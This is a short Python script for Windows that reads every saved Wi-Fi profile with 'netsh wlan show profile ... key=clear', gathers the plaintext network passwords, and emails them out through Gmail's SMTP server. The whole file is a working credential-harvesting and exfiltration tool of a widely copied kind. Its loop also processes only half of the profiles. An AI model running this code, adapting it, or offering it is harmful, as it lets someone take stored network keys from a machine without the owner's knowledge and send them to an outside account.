#!/usr/bin/env python

from __future__ import print_function
from subprocess import check_output, call
import smtplib
import re


def send_email(email_add, password, message):
    # SMTP server instence.
    # google server runs on 587 port
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # initiate tls connection
    server.starttls()
    # login to out email in order to send email
    server.login(email_add, password)
    server.sendmail(email_add, email_add, message)
    # close the smtp server
    server.quit()


def check_wireless(x):
    if x  == "There is no wireless interface on the system.":
        print("There is no wireless connection")
        call("exit", shell=True)
        return False
    return True

def all_passwords(names_network):
    result = ""
    for i in range((len(names_network)/2)):
         command = 'netsh wlan show profile name="{}" key=clear'.format(names_network[i])
         result += check_output(command, shell=True)
    return result

command = 'netsh wlan show profile'
wifi_networks = check_output(command, shell=True)
wifi_networks = wifi_networks.rstrip()
if check_wireless(wifi_networks) :
    names_network = re.findall("(?:Profile\s*:\s)(.*)", wifi_networks)
    passwords = all_passwords(names_network)
    email = raw_input("Please enter your email: ")
    password = raw_input("Please enter your password: ")
    send_email(email, password, passwords)